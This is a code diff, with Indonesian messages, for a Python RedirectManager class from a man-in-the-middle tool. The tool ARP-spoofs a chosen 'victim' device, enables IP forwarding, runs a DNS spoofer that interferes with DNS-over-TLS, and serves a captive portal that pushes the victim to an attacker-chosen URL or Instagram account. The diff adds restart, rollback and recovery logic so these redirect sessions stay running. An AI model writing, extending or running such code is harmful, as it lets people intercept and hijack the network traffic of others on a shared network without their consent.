@@ -83,87 +83,164 @@ class RedirectManager:
                 instagram_username = parts[1].split("/")[0].split("?")[0]
 
         with self._lock:
-            if victim_ip in self._sessions:
-                raise SpoofError(
-                    f"Sesi redirect untuk {victim_ip} masih aktif; hentikan sebelum memulai ulang"
-                )
-
             if victim_ip in self._partial_sessions:
                 self._stop_partial_session_unlocked(victim_ip)
 
-            interface = self.spoofer._interface
-            portal_started = False
-            portal_restore_target = None
-            arp_session_id = None
-            dns_spoofer = None
+            previous_snapshot = None
+            if victim_ip in self._sessions:
+                previous_snapshot = self._snapshot_session(
+                    self._sessions[victim_ip]
+                )
+                self._stop_session_unlocked(victim_ip)
 
+            start_args = {
+                "victim_ip": victim_ip,
+                "victim_mac": victim_mac,
+                "gateway_ip": gateway_ip,
+                "gateway_mac": gateway_mac,
+                "redirect_url": redirect_url,
+                "instagram_username": instagram_username,
+                "my_ip": my_ip,
+                "my_mac": my_mac,
+            }
             try:
-                # A. Aktifkan Captive Portal HTTP Server (Port 80) jika belum jalan
-                if not self.portal_server or not self.portal_server._running:
-                    self.portal_server = CaptivePortalServer(
-                        port=80,
-                        redirect_url=redirect_url,
-                        instagram_username=instagram_username
-                    )
-                    portal_started = True
-                    self.portal_server.start()
-                else:
-                    portal_restore_target = (
-                        self.portal_server.redirect_url,
-                        self.portal_server.instagram_username,
-                    )
-                    self.portal_server.update_target(redirect_url, instagram_username)
-
-                # B. Jalankan ARP Spoofing Kontinu khusus Mode Redirect (is_redirect=True)
-                arp_session_id = self.spoofer.start(
-                    victim_ip=victim_ip,
-                    victim_mac=victim_mac,
-                    gateway_ip=gateway_ip,
-                    gateway_mac=gateway_mac,
-                    speed_limit=0,
-                    is_redirect=True
-                )
-
-                # C. Pastikan Windows IP Forwarding AKTIF agar trafik Instagram tembus ke gateway
-                if not set_ip_forwarding(True, self.spoofer._win_interface_name):
-                    raise SpoofError("Gagal mengaktifkan IP forwarding untuk redirect")
-
-                # D. Jalankan DNS Spoofer untuk target IP & MAC (dengan Reactive ARP & DoT Reset)
-                dns_spoofer = DNSSpoofer(
-                    target_ip=victim_ip,
-                    target_mac=victim_mac,
-                    controller_ip=my_ip,
-                    interface=interface,
-                    self_mac=my_mac,
-                    gateway_ip=gateway_ip
-                )
-                dns_spoofer.start()
+                return self._start_session_unlocked(**start_args)
             except Exception as startup_error:
-                partial_session = {
-                    "victim_ip": victim_ip,
-                    "victim_mac": victim_mac,
-                    "gateway_ip": gateway_ip,
-                    "gateway_mac": gateway_mac,
-                    "redirect_url": redirect_url,
-                    "instagram_username": instagram_username,
-                    "arp_session_id": arp_session_id,
-                    "dns_spoofer": dns_spoofer,
-                    "portal_restore_target": portal_restore_target,
-                    "stop_portal_when_clean": portal_started,
-                    "started_at": time.time(),
-                }
-                self._partial_sessions[victim_ip] = partial_session
-                try:
-                    self._stop_partial_session_unlocked(victim_ip)
-                except SpoofError as rollback_error:
-                    raise SpoofError(
-                        f"Redirect startup gagal: {startup_error}; "
-                        f"rollback belum selesai: {rollback_error}"
-                    ) from startup_error
-                raise
+                if previous_snapshot is None:
+                    raise
 
-            # Simpan state sesi
-            session_data = {
+                if victim_ip in self._partial_sessions:
+                    try:
+                        self._stop_partial_session_unlocked(victim_ip)
+                    except SpoofError as cleanup_error:
+                        self._retain_recovery_state_unlocked(
+                            victim_ip,
+                            previous_snapshot,
+                            cleanup_error,
+                        )
+                        raise SpoofError(
+                            f"Redirect replacement gagal: {startup_error}; "
+                            f"recovery incomplete: {cleanup_error}"
+                        ) from startup_error
+
+                try:
+                    self._start_session_unlocked(
+                        victim_ip=previous_snapshot["victim_ip"],
+                        victim_mac=previous_snapshot["victim_mac"],
+                        gateway_ip=previous_snapshot["gateway_ip"],
+                        gateway_mac=previous_snapshot["gateway_mac"],
+                        redirect_url=previous_snapshot["redirect_url"],
+                        instagram_username=previous_snapshot["instagram_username"],
+                        my_ip=my_ip,
+                        my_mac=my_mac,
+                    )
+                except Exception as recovery_error:
+                    self._retain_recovery_state_unlocked(
+                        victim_ip,
+                        previous_snapshot,
+                        recovery_error,
+                    )
+                    raise SpoofError(
+                        f"Redirect replacement gagal: {startup_error}; "
+                        f"recovery incomplete: {recovery_error}"
+                    ) from startup_error
+
+                raise SpoofError(
+                    f"Redirect replacement gagal: {startup_error}; "
+                    "previous redirect restored"
+                ) from startup_error
+
+    @staticmethod
+    def _snapshot_session(session: Dict[str, Any]) -> Dict[str, Any]:
+        return {
+            "victim_ip": session["victim_ip"],
+            "victim_mac": session["victim_mac"],
+            "gateway_ip": session["gateway_ip"],
+            "gateway_mac": session["gateway_mac"],
+            "redirect_url": session["redirect_url"],
+            "instagram_username": session["instagram_username"],
+            "arp_session_id": session.get("arp_session_id"),
+            "started_at": session.get("started_at"),
+        }
+
+    def _retain_recovery_state_unlocked(
+        self,
+        victim_ip: str,
+        recovery_snapshot: Dict[str, Any],
+        recovery_error: Exception,
+    ):
+        partial = self._partial_sessions.setdefault(
+            victim_ip,
+            {
+                "victim_ip": victim_ip,
+                "arp_session_id": None,
+                "dns_spoofer": None,
+                "portal_restore_target": None,
+                "stop_portal_when_clean": False,
+                "started_at": time.time(),
+            },
+        )
+        partial["recovery_snapshot"] = recovery_snapshot
+        partial["recovery_failed"] = True
+        partial["recovery_error"] = str(recovery_error)
+
+    def _start_session_unlocked(
+        self,
+        *,
+        victim_ip: str,
+        victim_mac: str,
+        gateway_ip: str,
+        gateway_mac: str,
+        redirect_url: str,
+        instagram_username: str,
+        my_ip: str,
+        my_mac: str,
+    ) -> Dict[str, Any]:
+        interface = self.spoofer._interface
+        portal_started = False
+        portal_restore_target = None
+        arp_session_id = None
+        dns_spoofer = None
+
+        try:
+            if not self.portal_server or not self.portal_server._running:
+                self.portal_server = CaptivePortalServer(
+                    port=80,
+                    redirect_url=redirect_url,
+                    instagram_username=instagram_username
+                )
+                portal_started = True
+                self.portal_server.start()
+            else:
+                portal_restore_target = (
+                    self.portal_server.redirect_url,
+                    self.portal_server.instagram_username,
+                )
+                self.portal_server.update_target(redirect_url, instagram_username)
+
+            arp_session_id = self.spoofer.start(
+                victim_ip=victim_ip,
+                victim_mac=victim_mac,
+                gateway_ip=gateway_ip,
+                gateway_mac=gateway_mac,
+                speed_limit=0,
+                is_redirect=True
+            )
+
+            if not set_ip_forwarding(True, self.spoofer._win_interface_name):
+                raise SpoofError("Gagal mengaktifkan IP forwarding untuk redirect")
+
+            dns_spoofer = DNSSpoofer(
+                target_ip=victim_ip,
+                target_mac=victim_mac,
+                controller_ip=my_ip,
+                interface=interface,
+                self_mac=my_mac,
+                gateway_ip=gateway_ip
+            )
+            dns_spoofer.start()
+        except Exception as startup_error:
+            partial_session = {
                 "victim_ip": victim_ip,
                 "victim_mac": victim_mac,
                 "gateway_ip": gateway_ip,
@@ -172,18 +249,41 @@ class RedirectManager:
                 "instagram_username": instagram_username,
                 "arp_session_id": arp_session_id,
                 "dns_spoofer": dns_spoofer,
-                "started_at": time.time()
+                "portal_restore_target": portal_restore_target,
+                "stop_portal_when_clean": portal_started,
+                "started_at": time.time(),
             }
-            self._sessions[victim_ip] = session_data
+            self._partial_sessions[victim_ip] = partial_session
+            try:
+                self._stop_partial_session_unlocked(victim_ip)
+            except SpoofError as rollback_error:
+                raise SpoofError(
+                    f"Redirect startup gagal: {startup_error}; "
+                    f"rollback belum selesai: {rollback_error}"
+                ) from startup_error
+            raise
 
-            logger.info(f"✨ [Redirect Manager] Sesi redirect aktif untuk {victim_ip} -> {redirect_url}")
+        session_data = {
+            "victim_ip": victim_ip,
+            "victim_mac": victim_mac,
+            "gateway_ip": gateway_ip,
+            "gateway_mac": gateway_mac,
+            "redirect_url": redirect_url,
+            "instagram_username": instagram_username,
+            "arp_session_id": arp_session_id,
+            "dns_spoofer": dns_spoofer,
+            "started_at": time.time()
+        }
+        self._sessions[victim_ip] = session_data
 
-            return {
-                "victim_ip": victim_ip,
-                "redirect_url": redirect_url,
-                "instagram_username": instagram_username,
-                "arp_session_id": arp_session_id
-            }
+        logger.info(f"✨ [Redirect Manager] Sesi redirect aktif untuk {victim_ip} -> {redirect_url}")
+
+        return {
+            "victim_ip": victim_ip,
+            "redirect_url": redirect_url,
+            "instagram_username": instagram_username,
+            "arp_session_id": arp_session_id
+        }
 
     def _stop_session_unlocked(self, victim_ip: str):
         """Hentikan satu sesi tanpa mengambil lock lagi (internal)."""
@@ -246,7 +346,12 @@ class RedirectManager:
             for candidate in sessions.values()
         )
         should_stop_portal = session.get("stop_portal_when_clean", not partial)
-        if should_stop_portal and not other_sessions and self.portal_server:
+        if (
+            not errors
+            and should_stop_portal
+            and not other_sessions
+            and self.portal_server
+        ):
             portal = self.portal_server
             try:
                 portal.stop()
@@ -305,6 +410,21 @@ class RedirectManager:
                     self._stop_partial_session_unlocked(ip)
                 except SpoofError as e:
                     errors.append(str(e))
+
+            if (
+                not errors
+                and not self._sessions
+                and not self._partial_sessions
+                and self.portal_server
+            ):
+                portal = self.portal_server
+                try:
+                    portal.stop()
+                except Exception as e:
+                    errors.append(f"Portal cleanup failed: {e}")
+                else:
+                    if self.portal_server is portal:
+                        self.portal_server = None
 
             if errors:
                 raise SpoofError("; ".join(errors))
